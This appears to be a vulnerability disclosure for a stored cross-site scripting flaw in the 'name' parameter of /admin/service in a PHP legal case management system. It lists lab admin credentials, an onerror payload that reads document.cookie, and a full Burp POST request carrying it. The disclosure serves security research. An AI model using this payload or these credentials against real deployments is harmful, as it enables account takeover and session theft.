## Legal Case Management System

## XSS on `/admin/service`

### Vendor Homepage:

```
https://www.campcodes.com/projects/php/legal-case-management-system/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/admin/login
superadmin@gmail.com
12345678Ab@
```

### Affected Page:

```
/admin/service
```

The parameter `name` is being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

### Proof of Concept:

Payload:

```
<img src=1 onerror="alert(document.cookie)">
```

Burp Request:

```
POST /admin/service HTTP/1.1
Host: 192.168.150.131
Content-Length: 406
Accept: */*
DNT: 1
X-CSRF-TOKEN: ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydsEg8p4ZfgibcAzq
Origin: http://192.168.150.131
Referer: http://192.168.150.131/admin/service
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: XSRF-TOKEN=eyJpdiI6IlcrUnNqZkpLUDBaZUNCYkRPVUFQS3c9PSIsInZhbHVlIjoiUldtaHhndmp2MkJRenhPMnVWK2w5MHlpOFhWSlluNWhRbkVlOWtvZVlCVjNcLzg2aG83K2x3b2hRR3d0ck1lMVUiLCJtYWMiOiJiMWZlOTEyOWVkZDQ3NGY1ZGU0NTk0YTE1ZmRlYTUwNTAwMmI4NDBjNzMyNDdmYzFkNzA5Nzg3MTRlYjVkZjdkIn0%3D; test_session=eyJpdiI6ImxUYUhIVkp1dkNTaENCeXlVdEo2dWc9PSIsInZhbHVlIjoidk1hUTZnN0dValwvXC94Y2xJYVZhY1NzZFdUdmJOQUUxSkdPd1cxZXhhTEhYMWh3XC9VXC9TQWxjRHFtT1NFbTN6ejkiLCJtYWMiOiI5NGQ3NjJhM2Y3YTRhMWFjZWY3YTRjNjBlNzA0NTBiNzc5M2NhYTkwNzNiMzFjYmQ1NWJjMzAwMTQ4NDU4NjlmIn0%3D
Connection: close

------WebKitFormBoundarydsEg8p4ZfgibcAzq
Content-Disposition: form-data; name="_token"

ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
------WebKitFormBoundarydsEg8p4ZfgibcAzq
Content-Disposition: form-data; name="name"

<img src=1 onerror="alert(document.cookie)">
------WebKitFormBoundarydsEg8p4ZfgibcAzq
Content-Disposition: form-data; name="amount"

2
------WebKitFormBoundarydsEg8p4ZfgibcAzq--

```

### Screenshot

![image-20240509194650158](./screenshot/image-20240509194650158.png)
